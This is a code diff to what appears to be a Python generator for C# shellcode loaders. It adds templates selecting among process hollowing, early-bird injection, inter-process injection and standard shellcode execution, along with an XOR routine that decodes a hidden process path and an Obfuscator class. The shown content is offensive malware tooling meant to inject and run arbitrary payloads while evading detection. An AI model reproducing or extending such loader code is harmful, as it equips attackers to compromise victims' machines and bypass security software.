@@ -554,6 +554,29 @@ START_PROCESS_EARLYBIRD_CODE = """
             }
 """
 
+import_choices = {
+  'hollow':f"{START_PROCESS_HOLLOW_IMPORT}",
+  'interprocess':f"{START_PROCESS_INTERPROCESS_IMPORT}",
+  'earlybird':f"{START_PROCESS_EARLYBIRD_IMPORT}",
+  'standard':f"{START_SHELLCODE_IMPORT}"
+}
+
+main_choices = {
+  'hollow':"""
+    byte[] procname = new byte[] {{ {xor_path} }};
+
+    for (int i = 0; i < procname.Length; i++)
+    {{
+        procname[i] = (byte)(((uint)procname[i] ^ {xor_key}) & 0xFF);
+    }}
+
+    {ak.START_PROCESS_HOLLOW_CODE}""",
+  'interprocess':"{ak.START_PROCESS_INTERPROCESS_CODE}",
+  'earlybird':"{ak.START_PROCESS_EARLYBIRD_CODE}",
+  'standard':"{ak.START_SHELLCODE}"
+}
+
+
 class Obfuscator:
   def __init__(self, string, xor_key=b'\00'):
     self.raw = string
